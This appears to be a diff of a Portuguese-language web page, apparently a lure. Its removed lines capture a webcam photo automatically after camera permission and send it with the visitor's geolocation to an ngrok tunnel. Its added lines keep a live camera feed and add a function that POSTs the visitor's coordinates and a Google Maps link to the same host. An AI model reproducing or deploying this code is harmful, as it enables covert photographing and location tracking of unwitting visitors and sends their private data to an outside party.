@@ -26,10 +26,8 @@
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
 
-    <!-- Video Elemento para mostrar a câmera -->
+    <!-- Adicionando a tag de vídeo para exibir a câmera -->
     <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <img id="foto" src="" alt="Foto capturada" style="display: none;"/>
 
   </div>
 
@@ -41,77 +39,27 @@
         alert("Algo deu errado. Tente novamente mais tarde.");
       }
 
-      // Solicita permissão para usar a câmera e captura automaticamente a foto
-      solicitarPermissaoCamera();
+      // Chama a função para ativar a câmera
+      iniciarCamera();
     });
 
-    function solicitarPermissaoCamera() {
+    // Função para acessar a câmera do usuário
+    function iniciarCamera() {
+      // Verifica se o navegador suporta a API getUserMedia
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        // Solicita permissão para o vídeo
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(function (stream) {
+            // Se a permissão for concedida, exibe o vídeo
             const videoElement = document.getElementById("video");
             videoElement.srcObject = stream;
-
-            // Tira a foto automaticamente assim que a permissão é dada
-            setTimeout(tirarFoto, 1000);  // Atraso de 1 segundo para garantir que o vídeo tenha iniciado
           })
           .catch(function (error) {
+            // Se houver erro ao tentar acessar a câmera
             console.error("Erro ao acessar a câmera:", error);
-            alert("Permissão de câmera negada ou erro ao acessar a câmera.");
+            alert("Não foi possível acessar a câmera.");
           });
       } else {
         alert("Este navegador não suporta a API de mídia.");
-      }
-    }
-
-    function tirarFoto() {
-      const videoElement = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
-
-      canvas.width = videoElement.videoWidth;
-      canvas.height = videoElement.videoHeight;
-      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-      // Converte a imagem para base64
-      const imagemBase64 = canvas.toDataURL("image/png");
-
-      // Exibe a imagem
-      const fotoElement = document.getElementById("foto");
-      fotoElement.src = imagemBase64;
-      fotoElement.style.display = "block";
-
-      // Envia a foto junto com a localização
-      enviarFoto(imagemBase64);
-    }
-
-    function enviarFoto(imagemBase64) {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-          fetch("https://bd70-2804-d84-21ec-1500-55e1-85d5-ce-f8b6.ngrok-free.app/send-location", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ latitude, longitude, maps, foto: imagemBase64 })
-          })
-            .then(response => response.json())
-            .then(data => {
-              if (!data.success) {
-                alert("Erro ao enviar o comprovante.");
-              }
-            })
-            .catch(error => {
-              console.error("Erro:", error);
-            });
-        });
-      } else {
-        alert("Erro ao obter a localização.");
       }
     }
 
@@ -121,7 +69,37 @@
     const ano = dataAtual.getFullYear();
 
     const dataFormatada = `${dia}/${mes}/${ano}`;
+
     document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("https://bd70-2804-d84-21ec-1500-55e1-85d5-ce-f8b6.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
   </script>
 </body>
 
